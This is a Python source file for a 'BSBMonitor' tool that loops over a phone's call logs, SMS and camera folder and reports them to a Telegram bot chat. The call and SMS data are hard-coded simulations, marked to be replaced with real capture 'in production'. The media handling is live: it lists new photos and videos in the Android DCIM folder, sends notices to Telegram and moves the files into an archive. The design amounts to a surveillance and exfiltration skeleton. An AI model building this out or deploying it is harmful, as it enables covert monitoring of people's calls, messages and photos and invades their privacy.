# bsb/monitor.py
import os
import time
import threading
import shutil
from datetime import datetime
import telebot
from .utils import log_to_file

# ANSI color codes for terminal output
GREEN  = "\033[1;32m"
YELLOW = "\033[1;33m"
RED    = "\033[1;31m"
RESET  = "\033[0m"

import logging
logger = logging.getLogger("BSBMonitor")
logger.setLevel(logging.DEBUG)
ch = logging.StreamHandler()
ch.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)
logger.addHandler(ch)

class BSBMonitor:
    """
    A class that monitors device events (call logs, SMS, and new media)
    and sends detailed logs to a Telegram chat.
    """
    def __init__(self, token, chat_id, config=None):
        self.token = token
        self.chat_id = chat_id
        self.bot = telebot.TeleBot(token)
        self.monitoring = False

        # Setup log folder for temporary log files
        self.log_folder = os.path.join(os.getcwd(), "logs")
        if not os.path.exists(self.log_folder):
            os.makedirs(self.log_folder)
            logger.info(f"{GREEN}Created log folder: {self.log_folder}{RESET}")

        # Default configuration for file paths (adjust these for your device)
        default_config = {
            "image_dir": "/storage/emulated/0/DCIM/Camera",  # New images folder
            "archive_dir": os.path.join(os.getcwd(), "archive"),
        }
        if config:
            default_config.update(config)
        self.config = default_config
        if not os.path.exists(self.config["archive_dir"]):
            os.makedirs(self.config["archive_dir"])
            logger.info(f"{GREEN}Created archive folder: {self.config['archive_dir']}{RESET}")

        # Define the stop signal file (when present, monitoring stops)
        self.stop_signal_file = os.path.join(os.getcwd(), "stop.signal")

    def send_message(self, message):
        """
        Sends a text message to the Telegram chat.
        """
        try:
            self.bot.send_message(self.chat_id, message)
            logger.info(f"{GREEN}Sent message: {message}{RESET}")
        except Exception as e:
            logger.error(f"{RED}Failed to send message: {e}{RESET}")

    def send_file(self, file_path):
        """
        Sends a file to the Telegram chat.
        """
        if os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as f:
                    self.bot.send_document(self.chat_id, f)
                logger.info(f"{GREEN}Sent file: {file_path}{RESET}")
            except Exception as e:
                logger.error(f"{RED}Error sending file {file_path}: {e}{RESET}")
        else:
            logger.warning(f"{YELLOW}File not found: {file_path}{RESET}")

    def monitor_device(self):
        """
        Continuously monitors for simulated device events.
        In production, replace simulations with real device event capture.
        Also checks for a stop signal file to exit.
        """
        self.send_message("Device monitoring started.")
        while self.monitoring:
            # Check for stop signal file
            if os.path.exists(self.stop_signal_file):
                self.send_message("Stop signal received. Shutting down monitoring.")
                logger.info(f"{YELLOW}Stop signal detected. Exiting monitoring loop.{RESET}")
                os.remove(self.stop_signal_file)
                self.monitoring = False
                break

            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")

            # Simulated Call Log Event
            call_data = (f"Call Log:\n"
                         f"Caller: +1234567890\n"
                         f"Duration: 5 minutes\n"
                         f"Timestamp: {timestamp}")
            call_log_file = os.path.join(self.log_folder, f"call_log_{timestamp}.txt")
            log_to_file(call_log_file, call_data)
            self.send_file(call_log_file)

            # Simulated SMS Event
            sms_data = (f"SMS Log:\n"
                        f"Sender: +0987654321\n"
                        f"Message: Hello, this is a test SMS.\n"
                        f"Timestamp: {timestamp}")
            sms_log_file = os.path.join(self.log_folder, f"sms_log_{timestamp}.txt")
            log_to_file(sms_log_file, sms_data)
            self.send_file(sms_log_file)

            # Simulated Media Event (new image or video)
            image_dir = self.config.get("image_dir")
            if os.path.exists(image_dir):
                for filename in os.listdir(image_dir):
                    if filename.lower().endswith((".jpg", ".jpeg", ".png", ".mp4", ".avi", ".mkv")):
                        file_full_path = os.path.join(image_dir, filename)
                        media_data = f"New Media Detected:\nFilename: {filename}\nTimestamp: {timestamp}"
                        media_log_file = os.path.join(self.log_folder, f"media_log_{timestamp}.txt")
                        log_to_file(media_log_file, media_data)
                        self.send_file(media_log_file)
                        # Archive the media file so it's not sent again
                        archive_path = os.path.join(self.config["archive_dir"], filename)
                        shutil.move(file_full_path, archive_path)
                        logger.info(f"{GREEN}Archived media file: {filename}{RESET}")
            else:
                logger.warning(f"{YELLOW}Image directory not found: {image_dir}{RESET}")

            time.sleep(10)  # Wait 10 seconds between cycles

        self.send_message("Device monitoring has been stopped.")

    def start_monitoring(self):
        """
        Starts monitoring in a separate daemon thread.
        """
        self.monitoring = True
        monitor_thread = threading.Thread(target=self.monitor_device)
        monitor_thread.daemon = True
        monitor_thread.start()
        self.send_message("Monitoring is now active.")

    def stop_monitoring(self):
        """
        Issues a stop signal by creating the stop signal file.
        """
        with open(self.stop_signal_file, "w") as f:
            f.write("stop")
        self.send_message("Stop signal issued. Monitoring will halt shortly.")

def main():
    # Obtain credentials from user input
    token = input("Enter your Telegram bot token: ").strip()
    chat_id = input("Enter your Telegram chat ID: ").strip()
    monitor = BSBMonitor(token, chat_id)
    # Start Telegram bot polling in a separate thread (for command responsiveness)
    command_thread = threading.Thread(target=monitor.bot.polling, kwargs={"non_stop": True})
    command_thread.daemon = True
    command_thread.start()
    # Start monitoring device events
    monitor.start_monitoring()
    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        monitor.stop_monitoring()
        logger.info(f"{RED}Monitoring stopped by user.{RESET}")

if __name__ == "__main__":
    main()
